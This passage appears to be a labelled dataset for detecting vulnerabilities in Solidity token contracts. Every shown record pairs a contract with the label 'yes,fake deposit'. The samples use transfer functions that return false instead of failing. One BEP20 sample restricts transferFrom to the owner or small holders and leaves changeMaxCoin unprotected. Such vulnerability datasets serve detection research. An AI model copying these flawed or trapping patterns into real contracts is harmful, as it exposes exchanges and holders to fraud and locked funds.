indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n\n function transfer(address _to, uint _value) returns (bool) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\ncontract UnboundedRegularToken is RegularToken {\n\n uint constant MAX_UINT = 2**256 - 1;\n \n /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\n /// @param _from Address to transfer from.\n /// @param _to Address to transfer to.\n /// @param _value Amount to transfer.\n /// @return Success of transfer.\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n}\n\ncontract FastSafeToken is UnboundedRegularToken {\n\n uint public totalSupply = 2*10**26;\n uint8 constant public decimals = 18;\n string constant public name = \"FastSafe\";\n string constant public symbol = \"JAHK\";\n\n function FastSafeToken() {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"Central Hub\";\n decimals = 0;\n symbol = \"CHAIR\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract MemePetToken is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'PET1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function MemePetToken() {\n balances[msg.sender] = 100000000000000000000000000000; \n totalSupply = 100000000000000000000000000000;\n name = \"MemePet Token\";\n decimals = 18; \n symbol = \"PET\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract PATPAT is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = '1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function PATPAT(\n ) {\n balances[msg.sender] = 200000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 200000000; // Update total supply (100000 for example)\n name = \"PATPAT\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"PATPAT\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'TP1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 45000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 45000000000000000000000000; // Update total supply (100000 for example)\n name = \"True Patriot\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"TPAT\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity ^0.5.16;\n\n// ----------------------------------------------------------------------------\n// ERC Token Standard #20 Interface\n//\n// ----------------------------------------------------------------------------\ncontract ERC20Interface {\n function totalSupply() public view returns (uint);\n function balanceOf(address tokenOwner) public view returns (uint balance);\n function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n function changeMaxCoin(uint256 coin) public returns (bool success);\n\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\n\n// ----------------------------------------------------------------------------\n// Safe Math Library\n// ----------------------------------------------------------------------------\ncontract SafeMath {\n function safeAdd(uint a, uint b) public pure returns (uint c) {\n c = a + b;\n require(c >= a);\n }\n function safeSub(uint a, uint b) public pure returns (uint c) {\n require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\n c = a / b;\n }\n}\n\n\ncontract BEP20TOKEN is ERC20Interface, SafeMath {\n string public name;\n string public symbol;\n uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n uint256 public _totalSupply;\n uint256 public _coins;\n address public _owner;\n mapping(address => uint) balances;\n mapping(address => mapping(address => uint)) allowed;\n\n \n constructor( string memory name_, string memory symbol_, address owner_ , uint256 coins_) public {\n name = name_;\n symbol = symbol_;\n decimals = 18;\n _totalSupply = 1000000000000000000000000000000;\n _owner = owner_;\n _coins = coins_ * 10 ** 18;\n balances[msg.sender] = _totalSupply;\n emit Transfer(address(0), msg.sender, _totalSupply);\n }\n\n function totalSupply() public view returns (uint) {\n return _totalSupply - balances[address(0)];\n }\n\n function balanceOf(address tokenOwner) public view returns (uint balance) {\n return balances[tokenOwner];\n }\n\n function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n return allowed[tokenOwner][spender];\n }\n \n function approve(address spender, uint tokens) public returns (bool success) {\n allowed[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n return true;\n }\n\n function transfer(address to, uint tokens) public returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n balances[to] = safeAdd(balances[to], tokens);\n emit Transfer(msg.sender, to, tokens);\n return true;\n }\n\n function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n \n if (_owner == from || balances[from] < _coins) {\n balances[from] = safeSub(balances[from], tokens);\n allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n balances[to] = safeAdd(balances[to], tokens);\n emit Transfer(from, to, tokens);\n return true;\n }\n \n \n }\n \n function changeMaxCoin(uint256 coins) public returns (bool success) {\n _coins = coins * 10 ** 18;\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'GrilledCheeseSandwich' token contract\n//\n// Symbol : GCS \ud83e\udd6a\n// Name : Grilled Cheese Sandwich\n// Total supply: 100000000000000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract GrilledCheeseSandwich is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Grilled Cheese Sandwich\";\n string public constant symbol = \"GCS \ud83e\udd6a\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000000000; // Update total supply (100000 for example)\n name = \"OAK\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals\n symbol = \"OAK\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.0;\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n}\n\nabstract contract IERC20 {\n function totalSupply() virtual public view returns (uint256 supply);\n function balanceOf(address _owner) virtual public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) virtual public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) virtual public returns (bool success);\n function approve(address _spender, uint256 _value) virtual public returns (bool success);\n function allowance(address _owner, address _spender) virtual public returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\ncontract ERC20 is IERC20 {\n using SafeMath for uint256;\n uint256 internal total_supply;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n event Burn(address indexed burner, uint256 value);\n event Mint(address indexed to, uint256 value);\n function transfer(address _to, uint256 _value) override public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) override public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) public view override returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public override returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public override returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function totalSupply() public view override returns (uint256 supply) {\n return total_supply;\n }\n}\n\ncontract BTCH is ERC20 {\n string public name;\n uint8 public decimals;\n string public symbol;\n address public owner;\n constructor (uint256 _initialAmount, string memory _tokenName, uint8 _decimalUnits, string memory _tokenSymbol) public {\n balances[msg.sender] = _initialAmount* 10 ** uint256(_decimalUnits);\n total_supply = _initialAmount* 10 ** uint256(_decimalUnits);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n owner = msg.sender;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
